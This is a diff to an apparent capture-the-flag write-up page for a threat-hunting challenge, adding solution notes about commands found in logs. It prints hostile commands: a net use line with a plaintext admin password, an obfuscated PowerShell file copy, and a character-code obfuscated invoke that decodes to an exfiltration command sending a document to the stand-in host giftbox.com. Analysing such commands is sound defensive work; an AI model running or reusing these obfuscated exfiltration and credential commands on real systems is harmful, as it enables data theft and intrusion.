@@ -907,9 +907,21 @@
 <p>Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.</p>
 </details>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
+<div class="highlight"><pre><span></span><code>Notes: Case 4 time stamp for the command to list network shares was actually not correct. The challenge accepted the timestamp of the net /share command rather than net use.
+
+Powershell code found:
+
+Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&amp;ccm&amp;]clientsdk | Out-Null
+</code></pre></div>
+<p>cmd.exe /C net use \NorthPolefileshare\c$ /user:admin AdminPass123</p>
+<p>( 'txt.tsiLeciNythguaN\potkseD:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''</p>
+<p>translates to: powershell -c Copy-Item \NorthPoleFiles\c\MissionCritical\NiceList.txt C:\Desktop\NiceList.txt</p>
+<p>[StRiNg]::JoIn( '', <a href="100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101">ChaR[]</a>)|&amp; ((gv '<em>MDr</em>').NamE[3,11,2]-joiN</p>
+<p>converted to text:
+downwithsanta.exe -exfil C:\Desktop\NaughtNiceList.docx \giftbox.com\file</p>
 <p>...</p>
 <h3 id="images">Images<a class="headerlink" href="#images" title="Permanent link">⚓︎</a></h3>
-<p><img alt="..." src="..." /></p>
+<p><img alt="MS Copilot help" src="../../img/objectives/o13/decoded_from_ms_copilot.PNG" /></p>
 <div class="admonition success">
 <p class="admonition-title">Answer</p>
 <p>Insert the answer to the objective here.</p>
